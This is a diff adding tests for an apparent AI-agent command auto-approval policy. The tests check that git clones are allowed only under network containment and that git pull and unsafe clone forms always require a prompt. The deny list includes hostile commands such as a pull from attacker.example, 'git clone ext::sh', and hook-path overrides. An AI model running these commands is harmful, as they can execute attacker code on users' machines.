@@ -596,3 +596,40 @@ describe('assessAutoApproval — secrets inside the workspace', () => {
     assert.equal(approved('gh auth status', 'read'), 'read')
   })
 })
+
+describe('network-contained shapes', () => {
+  const contained = (command: string, level: AutoApprovalLevel = 'read'): string => {
+    const decision = assessAutoApproval(command, { ...ctx(level), networkContained: true })
+    return decision.action === 'auto-approve' ? decision.tier : 'prompt'
+  }
+
+  it('admits clone only when the run stays network-contained', () => {
+    for (const command of [
+      'git clone --depth 1 https://github.com/acme/lib vendor/lib',
+      'git clone git@github.com:acme/lib.git',
+    ]) {
+      prompts(command)
+      assert.equal(contained(command), 'read', command)
+    }
+  })
+
+  it('never admits pull, and still refuses unsafe clone forms', () => {
+    for (const command of [
+      // A pull's merge runs the repository's filter drivers and hooks.
+      'git pull',
+      'git pull --ff-only origin main',
+      'git pull https://attacker.example/x main',
+      'git clone /srv/git/app.git',
+      'git clone file:///srv/git/app.git',
+      'git clone ext::sh',
+      'git clone --template=.hooks https://github.com/acme/lib',
+      'git clone --recurse-submodules https://github.com/acme/lib',
+      'git clone https://github.com/acme/lib ../outside',
+      'git clone https://github.com/acme/lib /tmp/x',
+      'git clone --filter=sparse:oid=HEAD https://github.com/acme/lib',
+      'git -c core.hooksPath=.h clone https://github.com/acme/lib',
+    ]) {
+      assert.equal(contained(command, 'remote-write'), 'prompt', command)
+    }
+  })
+})
